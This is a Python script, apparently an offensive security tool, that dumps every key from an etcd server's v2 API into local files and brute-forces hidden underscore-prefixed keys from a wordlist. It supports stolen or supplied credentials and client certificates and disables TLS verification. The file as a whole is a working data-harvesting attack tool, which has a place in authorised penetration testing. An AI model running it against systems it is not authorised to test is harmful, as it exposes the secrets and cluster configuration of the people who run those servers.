#!/usr/bin/python
import requests
import json
import os
import argparse
from requests.auth import HTTPBasicAuth

##################From https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse
def str2bool(v):
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')

parser = argparse.ArgumentParser(description='Harvest key information from etcd.')
parser.add_argument('--wordlist', help='specify a wordlist for brute forcing hidden keys. Words should NOT start with _')
parser.add_argument('--target', help='target system in the format: 127.0.0.1:2379', default="127.0.0.1:2379")
parser.add_argument('--outdir', help='output directory for found keys', default="output")
parser.add_argument('--creds', help='credentials if system uses RBAC (format username:password)')
parser.add_argument('--ssl', type=str2bool, nargs='?', const=True, default=False, help='enable ssl')
parser.add_argument('--cert', help='Public key client certificate for authentication to etcd')
parser.add_argument('--key', help='Private key client certificate for authentication to etcd')
args = parser.parse_args()

serverAddress=args.target
validnodes=[""]

outdir = "output"
if not os.path.exists(outdir):
  os.makedirs(outdir)


def safe_unicode(obj, *args):
    """ return the unicode representation of obj """
    try:
        return unicode(obj, *args)
    except UnicodeDecodeError:
        # obj is byte string
        ascii_text = str(obj).encode('string_escape')
        return unicode(ascii_text)

def getNodeContents(dirname):
  protocol="http://"
  if (args.ssl == True):
    protocol="https://"

  url = protocol + serverAddress + "/v2/keys" + dirname
  httpHeaders = { "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5",  "Connection": "close"}
  if ((args.creds == "" or args.creds is None) and (args.cert is None or args.key is None)):
    response = requests.get(url, headers=httpHeaders, verify=False)
  elif (args.creds is not None):
    credarray=args.creds.split(':')
    response = requests.get(url, headers=httpHeaders, verify=False, auth=HTTPBasicAuth(credarray[0], credarray[1]))
  elif (args.cert is not None and args.key is not None):
    response = requests.get(url, headers=httpHeaders, verify=False, cert=(args.cert, args.key))
  #print(url)
  #print(response.content)
  if response.status_code == 200:
    nodelist = response.json()["node"]
    return nodelist
  elif response.status_code == 401:
    print("Access denied! Try credentials.\nRestricted directory name: " + dirname)
    return []
  else:
    return []

def processDir(dirname):
  nodelist = getNodeContents(dirname)
  if ("nodes" in nodelist):
    for node in nodelist["nodes"]:
      if ("dir" in node):
        print("found directory:" + node["key"])
        
        if not os.path.exists(outdir + node["key"]):
          os.makedirs(outdir + node["key"])
        if node["key"] not in validnodes: 
          validnodes.append(node["key"])
          print("Found valid node: " + node["key"])
        processDir(node["key"])
      else:
        print("found data:" + node["key"])
        text_file = open(outdir + node["key"], "w+")
        unicode_text = safe_unicode(node["value"])
        text_file.write(unicode_text.encode("utf-8"))
        #print(node["value"].decode("unicode-escape"))
        text_file.close()
#  else:
#    #empty directory
#    print("empty directory")

def bruteforce():
  print("Beginning brute force using: " + args.wordlist)
#  print(validnodes)
  for validnode in validnodes:
    with open(args.wordlist) as bruteforcefile:
      for line in bruteforcefile:
        testword=line.strip()
        if (len(testword)>0):
          print("Brute forcing:" + validnode + "/_" + testword)
          processDir(validnode + "/_" + testword)

processDir("/")
if (args.wordlist is not None):
  bruteforce()

